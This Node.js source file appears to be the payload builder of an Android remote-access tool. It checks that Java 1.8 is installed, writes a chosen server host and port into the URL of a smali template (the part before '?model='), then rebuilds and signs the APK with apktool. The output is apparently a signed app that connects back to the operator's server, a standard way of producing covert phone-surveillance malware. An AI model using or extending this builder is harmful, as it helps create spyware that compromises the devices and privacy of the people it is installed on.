const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

// Thanks -> https://stackoverflow.com/a/19734810/7594368
// This function is a pain in the arse, so many issues because of it! -- hopefully this fix, fixes it!
function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    let called = false;
    spawn.on('error', (err) => {
        if (!called) {
            called = true;
            callback("Unable to spawn Java - " + err, null);
        }
    });
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        if (called) return;
        called = true;
        
        let javaVersionMatch = output.match(/(?:java|openjdk) version "([^"]+)"/);
        let versionString = javaVersionMatch ? javaVersionMatch[1] : "";
        
        if (versionString !== "") {
            if (versionString.startsWith("1.8.0")) {
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, versionString);
            } else return callback("Wrong Java Version Installed. Detected " + versionString + ". Please use Java 1.8.0", undefined);
        } else return callback("Java Not Installed", undefined);
    });
}

let isBuilding = false;
const BUILD_TIMEOUT_MS = 5 * 60 * 1000; // 5 minutes max per build
let buildTimeout = null;

function resetBuildFlag() {
    isBuilding = false;
    if (buildTimeout) {
        clearTimeout(buildTimeout);
        buildTimeout = null;
    }
}

function patchAPK(URI, PORT, cb) {
    if (isBuilding) return cb('Another build is currently in progress. Please wait.');
    isBuilding = true;
    buildTimeout = setTimeout(resetBuildFlag, BUILD_TIMEOUT_MS);

    // Sanitize URI and PORT
    if (!/^[a-zA-Z0-9.-]+$/.test(URI)) {
        resetBuildFlag();
        return cb('Invalid URI');
    }
    let portInt = parseInt(PORT, 10);
    if (isNaN(portInt) || portInt < 2048 || portInt > 25565) {
        resetBuildFlag();
        return cb('Invalid Port');
    }

    fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
        if (err) {
            resetBuildFlag();
            return cb('File Patch Error - READ');
        }
        
        // Patch 3: Guard against missing markers
        let startIdx = data.indexOf("http://");
        let endIdx = data.indexOf("?model=");
        if (startIdx === -1 || endIdx === -1) {
            resetBuildFlag();
            return cb('Corrupted APK Template - Markers Missing');
        }

        var result = data.replace(data.substring(startIdx, endIdx), "http://" + URI + ":" + portInt);
        fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
            if (err) {
                resetBuildFlag();
                return cb('File Patch Error - WRITE')
            } else {
                // building will continue in buildAPK, so we keep isBuilding true
                return cb(false)
            }
        });
    });
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) {
            const buildArgs = ['-jar', CONST.apkTool, 'b', CONST.smaliPath, '-o', CONST.apkBuildPath];
            cp.execFile('java', buildArgs, (error, stdout, stderr) => {
                if (error) {
                    resetBuildFlag();
                    return cb('Build Command Failed - ' + error.message);
                } else {
                    const signArgs = ['-jar', CONST.apkSign, CONST.apkBuildPath, '-o', CONST.apkSignedBuildPath];
                    cp.execFile('java', signArgs, (error, stdout, stderr) => {
                        resetBuildFlag();
                        if (!error) return cb(false);
                        else return cb('Sign Command Failed - ' + error.message);
                    });
                }
            });
        } else {
            resetBuildFlag();
            return cb(err);
        }
    })
}

module.exports = {
    buildAPK,
    patchAPK
}
